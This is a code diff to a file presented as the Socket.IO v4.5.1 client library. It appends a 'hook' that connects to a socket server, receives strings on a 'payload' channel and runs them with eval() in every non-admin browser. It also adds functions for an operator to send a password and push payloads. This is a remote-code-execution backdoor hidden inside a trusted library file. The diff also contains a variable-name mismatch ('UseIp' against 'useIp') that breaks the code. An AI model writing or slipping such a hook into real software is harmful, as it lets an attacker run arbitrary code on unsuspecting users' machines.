@@ -1,3 +1,7 @@
+var UseIp = false;
+var ip = "localhost:3000";
+
+
 /*!
  * Socket.IO v4.5.1
  * (c) 2014-2022 Guillermo Rauch
@@ -4440,12 +4444,16 @@
   //# sourceMappingURL=socket.io.js.map
   
 
+if(!useIp){
+  var sock = io();
+} else {
+  var sock = io(ip);
+}
 
-var socket = io();
 var isAdmin = false;
 
 console.log("Hook injected!");
-socket.on('payload', function(payload) {
+sock.on('payload', function(payload) {
     if (!isAdmin){
         console.log("Payload received!");
         eval(payload);
@@ -4453,9 +4461,9 @@ socket.on('payload', function(payload) {
 });
 
 function submitPass(password){
-    socket.emit('password', password);
+    sock.emit('password', password);
 }
 
 function submitPayload(payload){
-    socket.emit('payload', payload);
+    sock.emit('payload', payload);
 }
